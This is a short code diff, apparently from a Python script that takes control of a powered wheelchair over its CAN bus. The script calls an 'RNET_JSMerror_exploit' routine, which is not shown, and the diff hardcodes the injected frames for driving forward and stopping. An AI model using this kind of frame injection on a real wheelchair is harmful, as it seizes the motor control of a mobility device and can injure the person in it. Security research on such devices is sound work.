@@ -45,7 +45,7 @@ def drive_forward(seconds):
     joy_id = RNET_JSMerror_exploit(can_socket)
 
     # CAN frame to move the wheelchair forward (following the structure in JoyLocal.py)
-    forward_frame = joy_id + '#000080'  # This frame may need adjustment
+    forward_frame = '02000000#1b64'  # This frame may need adjustment
 
     # Send the forward command
     cansend(can_socket, forward_frame)
@@ -54,7 +54,7 @@ def drive_forward(seconds):
     sleep(seconds)
 
     # CAN frame to stop the wheelchair
-    stop_frame = joy_id + '#000000'  # This frame may need adjustment
+    stop_frame = '02000000#0000'  # This frame may need adjustment
 
     # Send the stop command
     cansend(can_socket, stop_frame)
